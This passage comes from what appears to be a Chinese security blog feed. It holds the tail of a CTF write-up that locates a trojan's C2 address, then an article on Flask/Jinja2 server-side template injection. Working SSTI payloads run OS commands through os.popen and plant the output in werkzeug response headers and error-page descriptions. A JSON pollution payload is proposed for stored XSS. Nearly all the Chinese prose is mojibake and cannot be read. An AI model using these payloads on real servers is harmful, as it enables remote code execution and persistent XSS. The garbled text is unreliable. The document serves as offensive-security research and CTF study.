title="4.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤"></a>4.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤</h2><p>æˆ‘ä»¬çœ‹ç›®å½•å¯ä»¥å‘ç°åº”è¯¥shell(1).elfçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚<br>çŒœæµ‹å…¶ä¸ºè¿œæ§ç¨‹åºä¹‹ç±»çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦è¿è¡Œç„¶åçœ‹ç½‘ç»œæµé‡ä¸å°±å¯ä»¥äº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">netstat -antlp</span><br><span class="line"></span><br><span class="line">-a: æ˜¾ç¤ºæ‰€æœ‰çš„è¿æ¥å’Œç›‘å¬çš„ç«¯å£ï¼ŒåŒ…æ‹¬å·²è¿æ¥çš„å’Œå¤„äºç›‘å¬çŠ¶æ€çš„ç«¯å£ã€‚</span><br><span class="line">-n: æ˜¾ç¤ºæ•°å­—å½¢å¼çš„åœ°å€å’Œç«¯å£å·ï¼Œè€Œä¸æ˜¯åŸŸåå’ŒæœåŠ¡åç§°ã€‚è¿™æ ·å¯ä»¥åŠ é€Ÿè¾“å‡ºæ˜¾ç¤ºï¼Œå› ä¸ºç³»ç»Ÿä¸ä¼šæ‰§è¡ŒåŸŸåè§£æã€‚</span><br><span class="line">-t: ä»…æ˜¾ç¤º TCP è¿æ¥ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œnetstat ä¼šæ˜¾ç¤ºæ‰€æœ‰åè®®çš„è¿æ¥ï¼ˆå¦‚ TCPã€UDPï¼‰ï¼Œä½†åŠ ä¸Š -t åï¼Œç»“æœåªä¼šæ˜¾ç¤º TCP è¿æ¥ã€‚</span><br><span class="line">-l: ä»…æ˜¾ç¤ºç›‘å¬çŠ¶æ€çš„ç«¯å£ã€‚å®ƒä¸ä¼šæ˜¾ç¤ºå·²ç»å»ºç«‹çš„è¿æ¥ï¼Œåªä¼šæ˜¾ç¤ºå½“å‰æ­£åœ¨ç›‘å¬çš„ç«¯å£ã€‚</span><br><span class="line">-p: æ˜¾ç¤ºæ¯ä¸ªè¿æ¥æˆ–ç›‘å¬ç«¯å£çš„è¿›ç¨‹ IDï¼ˆPIDï¼‰å’Œå¯¹åº”çš„ç¨‹åºåç§°ã€‚è¿™æ ·ä½ å¯ä»¥çœ‹åˆ°å“ªäº›ç¨‹åºæ­£åœ¨ä½¿ç”¨ç½‘ç»œè¿æ¥ã€‚</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸ŠæŒ‡ä»¤æ¥ç›‘å¬<br>æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£<br>ä»¥æ•°å­—æ ¼å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£<br>ä»…æ˜¾ç¤º TCP è¿æ¥<br>ä»…æ˜¾ç¤ºå¤„äºç›‘å¬çŠ¶æ€çš„ç«¯å£<br>æ˜¾ç¤ºè¿›ç¨‹ ID å’Œç¨‹åºåç§°</p><p>å†è¿è¡Œæ¶æ„çš„shell(1).elfæ–‡ä»¶</p><p>å½“ç„¶è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰æ‰§è¡Œæƒé™æ–‡ä»¶ç›´æ¥ä½¿ç”¨chmodæ¥è¯¥æƒé™æ¥å³å¯</p><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-232855720.png" class="">  <p><strong>æ³¨æ„æˆ‘æ˜¯å†åšé¢˜æ—¶è¿›è¡Œè¿™ç§æ“ä½œï¼Œå¦‚æœæ˜¯å†ç°å®åœºæ™¯ä¸­æˆ‘ä»¬éœ€è¦å†è™šæ‹Ÿæœºä¸­è¿›è¡Œ</strong></p><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ²™ç®±ã€‚<br><img src="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/IMG_20241124-233123508.png" class=""><br>ä½†æ˜¯æ²™ç®±å¹¶ä¸èƒ½å¾—å‡ºç«¯å£å·ã€‚<br>flag{10.11.55.21}</p><h2 id="5-é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤"><a href="#5-é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤" class="headerlink" title="5.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤"></a>5.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤</h2><p>ä¸Šé¢å·²ç»å‡ºäº†<br>flag{3333}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python flask æ–°å‹å›æ˜¾çš„å­¦ä¹ å’Œè¿›ä¸€æ­¥çš„æ·±å…¥</title>
      <link href="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/"/>
      <url>/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºflaskè¯·æ±‚å¤´å›æ˜¾çš„å­¦ä¹ å’Œæ¢ç©¶å¦‚ä½•è¿›è¡Œé”™è¯¯é¡µé¢æ±¡æŸ“å›æ˜¾-æ²¡æƒ³åˆ°è¿™éƒ½èƒ½è¿‡ï¼Œåªèƒ½è¯´è¸ç€å‰äººçš„è·¯å‰å‰è¡Œäº†ã€‚"><a href="#æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºflaskè¯·æ±‚å¤´å›æ˜¾çš„å­¦ä¹ å’Œæ¢ç©¶å¦‚ä½•è¿›è¡Œé”™è¯¯é¡µé¢æ±¡æŸ“å›æ˜¾-æ²¡æƒ³åˆ°è¿™éƒ½èƒ½è¿‡ï¼Œåªèƒ½è¯´è¸ç€å‰äººçš„è·¯å‰å‰è¡Œäº†ã€‚" class="headerlink" title="æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºflaskè¯·æ±‚å¤´å›æ˜¾çš„å­¦ä¹ å’Œæ¢ç©¶å¦‚ä½•è¿›è¡Œé”™è¯¯é¡µé¢æ±¡æŸ“å›æ˜¾ æ²¡æƒ³åˆ°è¿™éƒ½èƒ½è¿‡ï¼Œåªèƒ½è¯´è¸ç€å‰äººçš„è·¯å‰å‰è¡Œäº†ã€‚"></a>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒº<a href="https://xz.aliyun.com/t/16325">flaskè¯·æ±‚å¤´å›æ˜¾çš„å­¦ä¹ å’Œæ¢ç©¶å¦‚ä½•è¿›è¡Œé”™è¯¯é¡µé¢æ±¡æŸ“å›æ˜¾</a> æ²¡æƒ³åˆ°è¿™éƒ½èƒ½è¿‡ï¼Œåªèƒ½è¯´è¸ç€å‰äººçš„è·¯å‰å‰è¡Œäº†ã€‚</h1><h1 id="å†™è¿™ç¯‡æ–‡ç« çš„èµ·å› æ˜¯æˆ‘åœ¨æ— èŠé€›å…ˆçŸ¥ç¤¾åŒºæ—¶å‘ç°äº†è¿™ä¸¤ç¯‡æ–‡ç« "><a href="#å†™è¿™ç¯‡æ–‡ç« çš„èµ·å› æ˜¯æˆ‘åœ¨æ— èŠé€›å…ˆçŸ¥ç¤¾åŒºæ—¶å‘ç°äº†è¿™ä¸¤ç¯‡æ–‡ç« " class="headerlink" title="å†™è¿™ç¯‡æ–‡ç« çš„èµ·å› æ˜¯æˆ‘åœ¨æ— èŠé€›å…ˆçŸ¥ç¤¾åŒºæ—¶å‘ç°äº†è¿™ä¸¤ç¯‡æ–‡ç« "></a>å†™è¿™ç¯‡æ–‡ç« çš„èµ·å› æ˜¯æˆ‘åœ¨æ— èŠé€›å…ˆçŸ¥ç¤¾åŒºæ—¶å‘ç°äº†è¿™ä¸¤ç¯‡æ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/15780?time__1311=GqjxnQGQDQO4l6zG7DyDIh%3DHIeY5wPG8AeD#toc-0">Jinja2-SSTIé€šè¿‡Serverè¯·æ±‚å¤´å¸¦å‡ºå‘½ä»¤å›æ˜¾</a><br><a href="https://xz.aliyun.com/t/15994?time__1311=GqjxcD2DnAY4lxGghDyDIxYTePkyh3GCAeD#toc-4">Jinja2-SSTI æ–°å›æ˜¾æ–¹å¼æŠ€æœ¯å­¦ä¹ </a><br>çœ‹å®Œè¿™ä¸¤ç¯‡æ–‡ç« æˆ‘å¯¹æ–‡ç« å†…å®¹è¿›è¡Œäº†å­¦ä¹ ä»¥åŠå¤ç°æœ‰äº†å‡ ä¸ªæƒ³æ³•ã€‚</p><p>1.åœ¨æˆ‘å¤ç°æ—¶å‘ç°äº†ä¸€ä¸ªè‡´å‘½çš„é—®é¢˜ï¼Œå°±æ˜¯å…¶å“åº”çš„è¯·æ±‚å¤´å†…å®¹å› ä¸ºè¦ç»è¿‡latin-1ç¼–ç å¿…é¡»è¦ä¸ºasciiç å­—ç¬¦ï¼Œå³å…¶ä¸€é‡åˆ°ä¸­æ–‡å­—ç¬¦ä¾¿ä¼šæŠ¥é”™(æˆ‘ä¸ªäººç»è¿‡æ€è€ƒè§‰å¾—æœ‰å¦‚ä¸‹è§£å†³æ–¹æ³•ï¼Œ1.é€šè¿‡ç¯¡æ”¹æŠ¥é”™é¡µé¢çš„å“åº”è¿›è¡Œå›æ˜¾ï¼Œ2.é€šè¿‡ç¼–ç æ¥è¾“å‡ºå­—ç¬¦)</p><p>2.æ–‡ç« ä½œè€…å°è¯•å¯¹500å›æ˜¾æ—¶çš„å†…å®¹è¿›è¡Œæ±¡æŸ“ä½†æ˜¯å…¶å´å¤±è´¥äº†ï¼Œä½œè€…æ±¡æŸ“çš„æ˜¯responsesä¸‹çš„500å…ƒç»„ï¼Œä½†æˆ‘æŸ¥çœ‹äº†ä¸€ä¸‹å…¶å€¼å‘ç°è¿™äºflaskçœŸæ­£çš„500å›æ˜¾ç›¸å·®æå¤§ã€‚é‚£ä¹ˆé‚£åº”è¯¥ä¸æ˜¯æ§åˆ¶500å›æ˜¾çš„ç±»ã€‚çœŸæ­£çš„ç±»æ˜¯ä»€ä¹ˆå‘¢?ï¼ˆæˆ‘ä¼šåœ¨ä¸‹é¢ç»™å‡ºç­”æ¡ˆï¼‰</p><p>3.è¿™ä¸ªsstiçš„å›æ˜¾æ–¹æ³•æœ¬è´¨ä¸Šæ˜¯å°†å›æ˜¾çš„å˜é‡è¿›è¡Œæ›´æ”¹ï¼Œå³æ±¡æŸ“ã€‚é‚£ä¹ˆè¿™ä¸ªèƒ½å¦åœ¨åŸå‹é“¾æ±¡æŸ“ä¸­è¿›è¡Œä¸€ä¸‹æ¼æ´åˆ©ç”¨å‘¢?</p><h1 id="è¯·æ±‚å¤´"><a href="#è¯·æ±‚å¤´" class="headerlink" title="è¯·æ±‚å¤´"></a>è¯·æ±‚å¤´</h1><p>é¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä¸€äº›flaskçš„è¯·æ±‚å’Œå“åº”æ˜¯åˆ©ç”¨äº†ä»€ä¹ˆã€‚<br>flaskçš„è¯·æ±‚å’Œå“åº”ä¸»è¦åˆ©ç”¨äº†werkzeugï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯werkzeugï¼Œå…¶ç»“æ„åˆæ˜¯ä»€ä¹ˆã€‚<br>werkzeugæ˜¯ä¸€ä¸ªåŸºäºpythonå¼€å‘çš„ä¸€ä¸ªwebå·¥å…·åŒ…ï¼Œå…¶æ˜¯flaskçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚å…¶åŠŸèƒ½æœ‰httpå·¥å…·ï¼Œè·¯ç”±ç³»ç»Ÿã€‚è°ƒè¯•ç­‰ã€‚<br>å…¶æ˜¯ä¸€ä¸ªæ¨¡å—åŒ–çš„åº“ã€‚å…¶æ ¸å¿ƒæ¨¡å—å¦‚ä¸‹<br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241119-213650805.png" class=""><br>å› ä¸ºæˆ‘ä»¬è¦ç ”ç©¶æ–°çš„å›æ˜¾æ–¹å¼æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠç›®å…‰æ”¾åˆ°werkzeug.wrapperså’Œwerkzeug.exceptionsè¿™ä¸¤ä¸ªæ¨¡å—ä¸‹ã€‚<br>å½“ç„¶ä¸Šé¢æ˜¯æˆ‘ä¸ªäººçš„æƒ³æ³•ï¼Œæˆ‘çœ‹çš„é‚£ä¸¤ç¯‡å…³äºæ–°å‹å›æ˜¾çš„æ–‡ç« éƒ½å¯¹WSGIRequestHandlerè¿›è¡Œç ”ç©¶.å¯¼è‡´ä¸¤ä½ä½œè€…éƒ½æ²¡èƒ½æ‰¾åˆ°å¦‚ä½•åœ¨500å“åº”bodyä¸­å›æ˜¾å‘½ä»¤æ‰§è¡Œï¼Œç¯¡æ”¹WSGIRequestHandlerä»è€Œå¯¹å“åº”å¤´è¿›è¡Œä¿®æ”¹çš„å…·ä½“åŸç†é‚£ä¸¤ä½ä½œè€…å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†å’Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p><p>æˆ‘è¿™é‡Œè®²ä¸€ä¸‹æˆ‘ä¸ªäººå†å¤ç°è¿‡ç¨‹ä¸­å‘ç°çš„å…¶ä»–ç¯¡æ”¹æ–¹æ³•</p><p>å› ä¸ºæˆ‘çš„å…¥æ‰‹ç‚¹æ˜¯å†werkzeug.wrapperså’Œwerkzeug.exceptionsä¸‹äºæ˜¯æˆ‘å…ˆæŸ¥çœ‹äº†werkzeug.wrappersçš„response.py,å†å…¶åˆå§‹åŒ–Responseç±»çš„åœ°æ–¹æ‰“ä¸Šäº†æ–­ç‚¹ï¼Œè€Œåå‘ç°å†å“åº”ç±»ä¸‹æœ‰è®¸å¤šå¯ä»¥ç¯¡æ”¹çš„è¯·æ±‚å¤´</p><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-171742989.png" class="">  <p>è€Œè¿™äº›ç±»éƒ½æ˜¯åœ¨werkzeugçš„wrapperså†…çš„request.pyå®šä¹‰çš„Requestç±»çš„å±æ€§<br>å³æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹payloadæ‰¾åˆ°æˆ‘ä»¬è¦æ±¡æŸ“çš„ç±»çš„å±æ€§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;dir&#x27;](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.wrappers.Response)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-201609075.png" class="">  <p>æˆ‘ä»¬åœ¨é‡Œé¢å¯ä»¥æ‰¾åˆ°default_statusç±»ï¼Œè¿™ä¸ªç±»æ˜¯æ§åˆ¶è¯·æ±‚çŠ¶æ€ç çš„ã€</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡setattræ¥ä¿®æ”¹è¿™ä¸ªå±æ€§çš„å€¼ï¼Œå°†è¿™ä¸ªå±æ€§çš„å€¼èµ‹å€¼ä¸ºæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„ç»“æœ<br>payload<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;setattr&#x27;</span>](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.wrappers.Response,<span class="string">&#x27;default_status&#x27;</span>,url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure></p><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-185923491.png" class="">  <p>ä½†å½“æˆ‘å°è¯•å‘½ä»¤diræ—¶å´å‡ºç°äº†é—®é¢˜å¦‚ä¸‹ã€‚<br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-162630474.png" class=""><br>åŸå› æˆ‘åœ¨ä¸Šé¢è¯´è¿‡äº†æ˜¯å› ä¸ºè¯·æ±‚å¤´åœ¨å‘é€ç»™å®¢æˆ·ç«¯å‰ä¼šè¿›è¡Œlatin-1ç¼–ç è¿™å¯¼è‡´äº†æŠ¥é”™<br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-202752159.png" class="">  </p><p>è¿™æ—¶æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨base64ç¼–ç <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;setattr&#x27;</span>](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.wrappers.Response,<span class="string">&#x27;default_status&#x27;</span>,url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64encode(url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read().encode()).decode())&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-200758492.png" class="">  </p><p>å‰©ä¸‹çš„è¯·æ±‚å¤´æˆ‘å°±ä¸å†èµ˜è¿°äº†</p><h1 id="é”™è¯¯é¡µé¢çš„æ±¡æŸ“æ–¹æ³•"><a href="#é”™è¯¯é¡µé¢çš„æ±¡æŸ“æ–¹æ³•" class="headerlink" title="é”™è¯¯é¡µé¢çš„æ±¡æŸ“æ–¹æ³•"></a>é”™è¯¯é¡µé¢çš„æ±¡æŸ“æ–¹æ³•</h1><p>ä¸Šé¢è¯´åˆ°äº†è¯·æ±‚å¤´æ— æ³•è¿”å›éasciiç å­—ç¬¦ï¼Œå³æˆ‘ä»¬éœ€è¦ä½¿ç”¨ç¼–ç æ¥è¾“å‡ºå‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p><p>è€ŒæœåŠ¡å™¨çš„å“åº”bodyæ˜¯å¯ä»¥æ­£å¸¸å›æ˜¾éasciiå­—ç¬¦çš„ã€‚<br>è¿™æ—¶å€™å…¶å®æˆ‘æ˜¯æƒ³æ‰¾èƒ½å¦å¯¹æ­£å¸¸çš„200å›æ˜¾çš„bodyè¿›è¡Œç¯¡æ”¹ï¼Œäºæ˜¯æˆ‘å°è¯•æ±¡æŸ“äº†dataçš„å€¼ï¼Œä½†æ˜¯æˆ‘å‘ç°å¹¶æ²¡æœ‰ä½¿å›æ˜¾çš„å€¼å‘é€æ”¹å˜ï¼Œè€Œåç®€å•è°ƒè¯•äº†ä¸€ä¸‹å‘ç°:åœ¨å‘ç»™å®¢æˆ·ç«¯å“åº”æ—¶ä¼šä½¿ç”¨set_dataæ¥æ›´æ”¹å…¶å€¼ï¼Œå…¶å€¼ä¼šè¢«æ›´æ”¹ä¸ºå‚æ•°responseçš„å€¼ã€‚</p><p>ç”±äºæœ¬äººæŠ€æœ¯æœ‰é™ï¼Œæ— æ³•æ‰¾åˆ°æ±¡æŸ“è¿™ä¸ªresponseçš„æ–¹æ³•ï¼Œå¦‚æœæœ‰å¤§ä½¬èƒ½æ‰¾åˆ°è¿˜è¯·æŒ‡ç‚¹</p><p>äºæ˜¯æœ¬äººå°±å°è¯•å¯»æ‰¾æ±¡æŸ“é”™è¯¯é¡µé¢çš„æ–¹æ³•ã€‚</p><p>å› ä¸ºwerkzeugçš„é”™è¯¯é¡µé¢æ—¶å›ºå®šçš„äºæ˜¯æœ¬äººçŒœæµ‹å…¶å€¼è‚¯å®šæ˜¯é¢„è®¾åœ¨æŸä¸ªç±»ä¸‹äº†ã€‚äºæ˜¯æˆ‘å°†ç›®å…‰æ”¾åœ¨äº†werkzeug.exceptionsä¸Š</p><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-204346037.png" class="">  <p>æˆ‘ä»¬çœ‹è¿™ä¸ªæ¨¡å—çš„ä»£ç ï¼Œå¯ä»¥å‘ç°å…¶å®šä¹‰æ‰€æœ‰çš„é”™è¯¯çŠ¶æ€ç ç±»ï¼Œæˆ‘è¿™é‡Œå°±æ‹¿500çŠ¶æ€ç æ¥è¯´ä¸€ä¸‹å§<br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶codeä¸ºçŠ¶æ€ç çš„å€¼ï¼Œdescriptionå®šä¹‰äº†å“åº”çš„é”™è¯¯å†…å®¹ï¼Œé‚£ä¹ˆè¿™ç§å†™æ­»çš„è‚¯å®šæ²¡æœ‰äºŒæ¬¡èµ‹å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†å…¶æ±¡æŸ“ä¸ºæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„ç»“æœ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;setattr&#x27;](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.InternalServerError,&#x27;description&#x27;,url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-204822336.png" class=""><br>å¯ä»¥å‘ç°å…¶ä»ç„¶å¯ä»¥å›æ˜¾ä¸­æ–‡å³éasciiå­—ç¬¦</p><p>åŒç†æˆ‘ä»¬è¿˜å¯ä»¥æ±¡æŸ“404ç­‰<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;setattr&#x27;](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound,&#x27;description&#x27;,url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-205029575.png" class="">  </p><h1 id="å…³äºåŸå‹é“¾æ±¡æŸ“çš„æ€è€ƒ"><a href="#å…³äºåŸå‹é“¾æ±¡æŸ“çš„æ€è€ƒ" class="headerlink" title="å…³äºåŸå‹é“¾æ±¡æŸ“çš„æ€è€ƒ"></a>å…³äºåŸå‹é“¾æ±¡æŸ“çš„æ€è€ƒ</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>æœ€ç®€å•ç²—æš´çš„æƒ³æ³•ã€‚æ—¢ç„¶æˆ‘ä»¬å¯ä»¥æ±¡æŸ“é”™è¯¯é¡µé¢çš„å›æ˜¾å†…å®¹é‚£ä¹ˆæˆ‘ä»¬ä¸å°±èƒ½å¯¹å…¶è¿›è¡Œxssäº†å—ã€‚ä¸ªäººè®¤ä¸ºä¸€ä¸ªäººè¿›å…¥ç½‘ç«™ä¸å°å¿ƒè§¦å‘404 505 500è¿™ç§é”™è¯¯çŠ¶æ€ç®€ç›´ä¸è¦å¤ªå¸¸è§ï¼Œè€Œè¿™ç§xsså¦‚æœä¸é‡å¯æœåŠ¡æ˜¯ä¼šä¸€ç›´å­˜åœ¨çš„ï¼Œç®—æ˜¯ä¸€ç§å­˜å‚¨å‹xssã€‚è¿˜æ˜¯å…·æœ‰ä¸€å®šå±å®³æ€§çš„</p><p>payloadå¦‚ä¸‹<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;werkzeug&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;exceptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;NotFound&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img 